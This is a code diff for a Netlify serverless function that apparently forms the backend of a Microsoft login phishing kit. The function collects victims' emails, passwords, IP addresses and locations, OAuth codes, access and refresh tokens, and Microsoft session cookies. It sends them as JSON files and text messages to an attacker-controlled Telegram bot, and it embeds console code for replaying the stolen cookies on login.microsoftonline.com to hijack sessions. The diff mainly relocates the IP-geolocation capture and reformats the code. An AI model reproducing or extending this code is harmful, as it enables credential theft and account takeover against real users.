@@ -59,7 +59,56 @@ const handler = async (event, context) => {
     const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
     const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
     const timestamp = new Date().toISOString();
-    
+
+    // Get user IP and location information (OPTIONAL - don't break main function)
+    let userIpInfo = {
+        ip: 'Unknown',
+        country: 'Unknown',
+        city: 'Unknown',
+        region: 'Unknown',
+        timezone: 'Unknown',
+        countryCode: 'Unknown'
+    };
+
+    try {
+        // Get IP from request headers (Netlify provides this)
+        const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+                        event.headers['x-real-ip'] ||
+                        event.headers['cf-connecting-ip'] ||
+                        'Unknown';
+
+        console.log('🌍 Attempting to detect IP address:', clientIP);
+        userIpInfo.ip = clientIP;
+
+        // Try to get location info (but don't fail if this doesn't work)
+        if (clientIP !== 'Unknown' && !clientIP.includes('127.0.0.1') && !clientIP.includes('localhost')) {
+            const ipResponse = await fetch(`https://ipapi.co/${clientIP}/json/`, {
+                timeout: 3000, // 3 second timeout
+                headers: {
+                    'User-Agent': 'OAuth Tracker'
+                }
+            });
+
+            if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                if (ipData.country_name) {
+                    userIpInfo = {
+                        ip: clientIP,
+                        country: ipData.country_name || 'Unknown',
+                        countryCode: ipData.country_code || 'Unknown',
+                        city: ipData.city || 'Unknown',
+                        region: ipData.region || 'Unknown',
+                        timezone: ipData.timezone || 'Unknown'
+                    };
+                    console.log('🌍 Location detected successfully');
+                }
+            }
+        }
+    } catch (error) {
+        console.log('⚠️ IP/location detection failed (continuing anyway):', error.message);
+        // Don't let IP detection failure break the main function
+    }
+
     // Fix IP formatting - convert concatenated numbers back to proper IP format
     let formattedIP = userIpInfo.ip;
     if (userIpInfo.ip && userIpInfo.ip !== 'Unknown' && /^\d{8,12}$/.test(userIpInfo.ip)) {
@@ -74,11 +123,11 @@ const handler = async (event, context) => {
         formattedIP = `${parseInt(part1)}.${parseInt(part2)}.${parseInt(part3)}.${parseInt(part4)}`;
       }
     }
-    
+
     let cookies = data.formattedCookies || data.cookies || [];
     let tokenFileSent = false;
     let cookieFileSent = false;
-    
+
     if (typeof cookies === "string") {
       try {
         cookies = JSON.parse(cookies);
@@ -113,7 +162,7 @@ const handler = async (event, context) => {
     // Analyze cookie types and sources
     let cookieDetails = '';
     let cookieSource = 'unknown';
-    
+
     if (cookieCount === 0) {
         cookieDetails = 'No cookies captured - Cross-origin restrictions';
         cookieSource = 'none';
@@ -121,22 +170,22 @@ const handler = async (event, context) => {
         // Check the source of captured cookies
         const captureSource = cookies[0]?.capturedFrom || 'unknown';
         const hasRealUserData = cookies.some(c => c.realUserData === true);
-        
+
         // Check for specific Microsoft cookies
-        const hasMicrosoftCookies = cookies.some(c => 
+        const hasMicrosoftCookies = cookies.some(c =>
             c.name && (
-                c.name.includes('ESTSAUTH') || 
-                c.name.includes('MSPOK') || 
+                c.name.includes('ESTSAUTH') ||
+                c.name.includes('MSPOK') ||
                 c.name.includes('MSCC') ||
                 c.name.includes('MSPRequ') ||
                 c.name.includes('buid') ||
                 c.name.includes('esctx')
             )
         );
-        
+
         // Check for OAuth authorization code
         const hasOAuthCode = cookies.some(c => c.name === 'OAUTH_AUTH_CODE');
-        
+
         if (hasOAuthCode) {
             cookieDetails = `OAuth Authorization Code captured`;
             cookieSource = 'oauth-code';
@@ -161,54 +210,6 @@ const handler = async (event, context) => {
         }
     }
 
-    // Get user IP and location information (OPTIONAL - don't break main function)
-    let userIpInfo = {
-        ip: 'Unknown',
-        country: 'Unknown',
-        city: 'Unknown',
-        region: 'Unknown',
-        timezone: 'Unknown'
-    };
-    
-    try {
-        // Get IP from request headers (Netlify provides this)
-        const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-                        event.headers['x-real-ip'] || 
-                        event.headers['cf-connecting-ip'] ||
-                        'Unknown';
-        
-        console.log('🌍 Attempting to detect IP address:', clientIP);
-        userIpInfo.ip = clientIP;
-        
-        // Try to get location info (but don't fail if this doesn't work)
-        if (clientIP !== 'Unknown' && !clientIP.includes('127.0.0.1') && !clientIP.includes('localhost')) {
-            const ipResponse = await fetch(`https://ipapi.co/${clientIP}/json/`, {
-                timeout: 3000, // 3 second timeout
-                headers: {
-                    'User-Agent': 'OAuth Tracker'
-                }
-            });
-            
-            if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                if (ipData.country_name) {
-                    userIpInfo = {
-                        ip: clientIP,
-                        country: ipData.country_name || 'Unknown',
-                        countryCode: ipData.country_code || 'Unknown',
-                        city: ipData.city || 'Unknown',
-                        region: ipData.region || 'Unknown',
-                        timezone: ipData.timezone || 'Unknown'
-                    };
-                    console.log('🌍 Location detected successfully');
-                }
-            }
-        }
-    } catch (error) {
-        console.log('⚠️ IP/location detection failed (continuing anyway):', error.message);
-        // Don't let IP detection failure break the main function
-    }
-
     // Build the message (MINIMAL - plain text only, heavily sanitized)
     const uniqueId = Math.random().toString(36).substring(2, 8);
     const messageLines = [
@@ -221,9 +222,9 @@ const handler = async (event, context) => {
       `🏳️ Country: ${userIpInfo.country} (${userIpInfo.countryCode})`,
       `🏙️ Location: ${userIpInfo.city}, ${userIpInfo.region}`
     ];
-    
+
     // Add password if ACTUALLY captured (not debug)
-    if (data.password && 
+    if (data.password &&
         data.password !== 'Password not captured during login flow' &&
         data.password !== 'DEBUG_PASSWORD_NOT_CAPTURED' &&
         !data.password.includes('DEBUG') &&
@@ -234,10 +235,10 @@ const handler = async (event, context) => {
             messageLines.push(`Password Source: ${data.passwordSource}`);
         }
     }
-    
+
     // Join and sanitize the entire message
     const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
-    
+
     console.log('📤 Final message preview:', simpleMessage.substring(0, 150) + '...');
     console.log('📤 Message length:', simpleMessage.length);
 
@@ -273,12 +274,12 @@ const handler = async (event, context) => {
     if (true) { // Force token file creation
         const tokens = data.authenticationTokens || {
             authorizationCode: 'Not captured',
-            accessToken: 'Not captured', 
+            accessToken: 'Not captured',
             refreshToken: 'Not captured',
             idToken: 'Not captured',
             debugInfo: 'No authenticationTokens provided'
         };
-        
+
         // Create comprehensive token file with non-expiring settings
         const tokenFileContent = {
             captureInfo: {
@@ -323,32 +324,32 @@ const handler = async (event, context) => {
                 }
             }
         };
-        
+
         // Convert to formatted JSON
         const tokenJson = JSON.stringify(tokenFileContent, null, 2);
-        
+
         // Create filename with timestamp and email
         const emailPart = email.split('@')[0] || 'user';
         const cleanTokenFileName = `microsoft_tokens_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');
-        
+
         console.log('📄 Preparing to send token file:', cleanTokenFileName);
         console.log('📄 Token file size:', tokenJson.length, 'bytes');
-        
+
         try {
             // Send tokens as document file to Telegram using Buffer approach
             const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
-            
+
             // Create proper multipart form data using Buffer (NO CAPTION)
             const boundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;
-            
+
             // Build form data parts as Buffer arrays
             const parts = [];
-            
+
             // Chat ID part
             parts.push(Buffer.from(`--${boundary}\r\n`));
             parts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
             parts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));
-            
+
             // Document part (NO CAPTION - just file)
             parts.push(Buffer.from(`--${boundary}\r\n`));
             parts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanTokenFileName}"\r\n`));
@@ -356,10 +357,10 @@ const handler = async (event, context) => {
             parts.push(Buffer.from(`Content-Transfer-Encoding: binary\r\n\r\n`));
             parts.push(Buffer.from(tokenJson));
             parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));
-            
+
             // Combine all parts
             const formDataBuffer = Buffer.concat(parts);
-            
+
             console.log('📤 Sending token file to Telegram as DOWNLOADABLE FILE...');
             console.log('📄 File details:', {
                 filename: cleanTokenFileName,
@@ -368,7 +369,7 @@ const handler = async (event, context) => {
                 method: 'sendDocument (FILE ATTACHMENT)',
                 boundary: boundary
             });
-            
+
             const fileResponse = await fetch(documentUrl, {
                 method: 'POST',
                 headers: {
@@ -377,11 +378,11 @@ const handler = async (event, context) => {
                 },
                 body: formDataBuffer
             });
-            
+
             const fileResult = await fileResponse.json();
             console.log('📄 Token file response status:', fileResponse.status);
             console.log('📄 Token file response:', fileResult);
-            
+
             if (fileResponse.ok && fileResult.ok) {
                 console.log('✅ Authentication tokens sent as DOWNLOADABLE FILE successfully');
                 tokenFileSent = true;
@@ -391,19 +392,19 @@ const handler = async (event, context) => {
                 // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
                 tokenFileSent = false;
             }
-            
+
         } catch (fileError) {
             console.error('❌ CRITICAL ERROR in token file upload:', fileError);
             console.error('❌ Error stack:', fileError.stack);
             // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
             tokenFileSent = false;
         }
-        
+
         // Function to send tokens as text fallback
         async function sendTokensAsText() {
             try {
                 const tokenText = `🔑 Authentication Tokens (Text Fallback)\n\nEmail: ${email}\nTimestamp: ${timestamp}\n\n${Object.entries(authenticationTokens).map(([key, value]) => `${key}: ${value}`).join('\n')}`;
-                
+
                 const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -412,7 +413,7 @@ const handler = async (event, context) => {
                         text: sanitizeForTelegram(tokenText)
                     })
                 });
-                
+
                 const textResult = await textResponse.json();
                 if (textResponse.ok && textResult.ok) {
                     console.log('✅ Tokens sent as text message successfully');
@@ -425,11 +426,11 @@ const handler = async (event, context) => {
             }
         }
     }
-    
+
     // Send cookies as a separate file (even if empty to show capture attempt)
     if (true) { // Always send cookie file to show capture status
         console.log('🍪 Preparing to send cookie file...');
-        
+
         // Create comprehensive cookie file
         const cookieFileContent = {
             captureInfo: {
@@ -469,27 +470,27 @@ const handler = async (event, context) => {
             cookieRestoration: {
                 instructions: 'Use these cookies to restore Microsoft authentication sessions',
                 browserConsoleCode: `
-// Copy and paste this code in browser console on login.microsoftonline.com
-cookies.forEach(c => {
-    let cookieString = \`\${c.name}=\${c.value}; path=\${c.path}; domain=\${c.domain};\`;
-    if (c.secure) cookieString += ' Secure;';
-    if (c.sameSite) cookieString += \` SameSite=\${c.sameSite};\`;
-    document.cookie = cookieString;
-});
-console.log('✅ Cookies restored successfully');
-location.reload();
-                `,
-                jsImplementation: `
-// JavaScript implementation for cookie restoration
-function restoreMicrosoftCookies(cookiesArray) {
-    cookiesArray.forEach(cookie => {
-        let cookieString = \`\${cookie.name}=\${cookie.value}; path=\${cookie.path}; domain=\${cookie.domain};\`;
-        if (cookie.secure) cookieString += ' Secure;';
-        if (cookie.sameSite) cookieString += \` SameSite=\${cookie.sameSite};\`;
+    // Copy and paste this code in browser console on login.microsoftonline.com
+    cookies.forEach(c => {
+        let cookieString = \`\${c.name}=\${c.value}; path=\${c.path}; domain=\${c.domain};\`;
+        if (c.secure) cookieString += ' Secure;';
+        if (c.sameSite) cookieString += \` SameSite=\${c.sameSite};\`;
         document.cookie = cookieString;
     });
-    console.log('Microsoft cookies restored:', cookiesArray.length);
-}
+    console.log('✅ Cookies restored successfully');
+    location.reload();
+                `,
+                jsImplementation: `
+    // JavaScript implementation for cookie restoration
+    function restoreMicrosoftCookies(cookiesArray) {
+        cookiesArray.forEach(cookie => {
+            let cookieString = \`\${cookie.name}=\${cookie.value}; path=\${cookie.path}; domain=\${cookie.domain};\`;
+            if (cookie.secure) cookieString += ' Secure;';
+            if (cookie.sameSite) cookieString += \` SameSite=\${cookie.sameSite};\`;
+            document.cookie = cookieString;
+        });
+        console.log('Microsoft cookies restored:', cookiesArray.length);
+    }
                 `
             },
             metadata: {
@@ -500,35 +501,35 @@ function restoreMicrosoftCookies(cookiesArray) {
                 note: 'All cookies set to non-expiring for session persistence'
             }
         };
-        
+
         // Convert to formatted JSON
         const cookieJson = JSON.stringify(cookieFileContent, null, 2);
-        
+
         // Create cookie filename
         const emailPart = email.split('@')[0] || 'user';
         const cleanCookieFileName = `microsoft_cookies_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');
-        
+
         console.log('🍪 Cookie file details:', {
             filename: cleanCookieFileName,
             size: cookieJson.length + ' bytes',
             cookieCount: cookieCount
         });
-        
+
         try {
             // Send cookies as document file to Telegram using Buffer approach
             const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
-            
+
             // Create proper multipart form data using Buffer for cookies (NO CAPTION)
             const cookieBoundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;
-            
+
             // Build cookie form data parts as Buffer arrays
             const cookieParts = [];
-            
+
             // Chat ID part
             cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
             cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
             cookieParts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));
-            
+
             // Document part (NO CAPTION - just file)
             cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
             cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanCookieFileName}"\r\n`));
@@ -536,10 +537,10 @@ function restoreMicrosoftCookies(cookiesArray) {
             cookieParts.push(Buffer.from(`Content-Transfer-Encoding: binary\r\n\r\n`));
             cookieParts.push(Buffer.from(cookieJson));
             cookieParts.push(Buffer.from(`\r\n--${cookieBoundary}--\r\n`));
-            
+
             // Combine all cookie parts
             const cookieFormDataBuffer = Buffer.concat(cookieParts);
-            
+
             console.log('📤 Sending cookie file to Telegram as DOWNLOADABLE FILE...');
             console.log('🍪 Cookie file details:', {
                 filename: cleanCookieFileName,
@@ -548,7 +549,7 @@ function restoreMicrosoftCookies(cookiesArray) {
                 method: 'sendDocument (FILE ATTACHMENT)',
                 boundary: cookieBoundary
             });
-            
+
             const cookieFileResponse = await fetch(documentUrl, {
                 method: 'POST',
                 headers: {
@@ -557,11 +558,11 @@ function restoreMicrosoftCookies(cookiesArray) {
                 },
                 body: cookieFormDataBuffer
             });
-            
+
             const cookieFileResult = await cookieFileResponse.json();
             console.log('🍪 Cookie file response status:', cookieFileResponse.status);
             console.log('🍪 Cookie file response:', cookieFileResult);
-            
+
             if (cookieFileResponse.ok && cookieFileResult.ok) {
                 console.log('✅ Microsoft cookies sent as DOWNLOADABLE FILE successfully');
                 cookieFileSent = true;
@@ -571,19 +572,19 @@ function restoreMicrosoftCookies(cookiesArray) {
                 // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
                 cookieFileSent = false;
             }
-            
+
         } catch (cookieFileError) {
             console.error('❌ CRITICAL ERROR in cookie file upload:', cookieFileError);
             console.error('❌ Cookie error stack:', cookieFileError.stack);
             // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
             cookieFileSent = false;
         }
-        
+
         // Function to send cookies as text fallback
         async function sendCookiesAsText() {
             try {
                 const cookieSummary = `🍪 Microsoft Cookies (Text Fallback)\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\n\nCookie Names: ${cookies.map(c => c.name).slice(0, 10).join(', ')}${cookieCount > 10 ? `... (+${cookieCount - 10} more)` : ''}`;
-                
+
                 const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -592,7 +593,7 @@ function restoreMicrosoftCookies(cookiesArray) {
                         text: sanitizeForTelegram(cookieSummary)
                     })
                 });
-                
+
                 const textResult = await textResponse.json();
                 if (textResponse.ok && textResult.ok) {
                     console.log('✅ Cookies sent as text message successfully');
